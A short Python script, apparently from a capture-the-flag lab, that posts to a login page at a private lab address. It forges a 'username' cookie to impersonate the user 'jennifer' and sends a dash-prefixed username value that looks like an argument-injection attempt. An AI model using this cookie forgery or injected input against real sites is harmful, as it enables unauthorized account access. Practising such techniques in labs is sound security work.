import requests

cookies = {
    'PHPSESSID': 'r4s6gqsjhrg644j7phs9bhplai',
    ###add this line
    'username': 'jennifer'
}

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://10.129.44.19',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer': 'http://10.129.44.19/index.php',
    'Accept-Language': 'en-US,en;q=0.9',
}

data = {
  'username': '-schallenge',
  'password': 'fdgfdg'
}

response = requests.post('http://10.129.44.19/index.php', headers=headers, cookies=cookies, data=data, verify=False)
print(response.text)